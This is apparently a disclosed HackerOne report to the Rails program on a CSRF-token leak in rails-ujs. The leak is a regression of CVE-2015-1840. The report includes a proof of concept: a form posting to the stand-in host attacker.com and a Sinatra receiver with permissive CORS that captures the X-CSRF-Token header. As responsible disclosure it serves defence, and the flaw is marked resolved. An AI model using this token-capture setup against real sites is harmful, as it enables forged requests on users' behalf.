---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '189878'
original_report_id: '189878'
title: CSRF header is sent to external websites when using data-remote forms
weakness: Cross-Site Request Forgery (CSRF)
team_handle: rails
created_at: '2016-12-09T16:27:17.706Z'
disclosed_at: '2020-05-26T22:38:40.225Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF header is sent to external websites when using data-remote forms

## Metadata

- HackerOne Report ID: 189878
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: rails
- Disclosed At: 2020-05-26T22:38:40.225Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Looks like there is a regression in the fix for CVE-2015-1840 ([H1 report](https://hackerone.com/reports/49935)). The origin isn't being checked before adding a CSRF header to `data-remote` forms. I noticed this when checking out the new rails-ujs repo.

Example Rails template:

```
<%= form_tag "http://attacker.com", remote: true do %>
  <button type=submit>submit</button>
<% end %>
```

Example http://attacker.com app

```
require "sinatra"

options '/*' do
  headers['Access-Control-Allow-Origin'] = "*"
  headers['Access-Control-Allow-Methods'] = "POST"
  headers['Access-Control-Allow-Headers'] ="x-csrf-token"
end

post '/*' do
  "foo"
end
```

When the form is submitted, an XHR request to attacker.com is sent, including the `X-CSRF-Token` header.

PS: @tenderlove told me to submit this here. I shouldn't get paid since I'm one of the GitHub folks who reviews these H1 submissions now.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
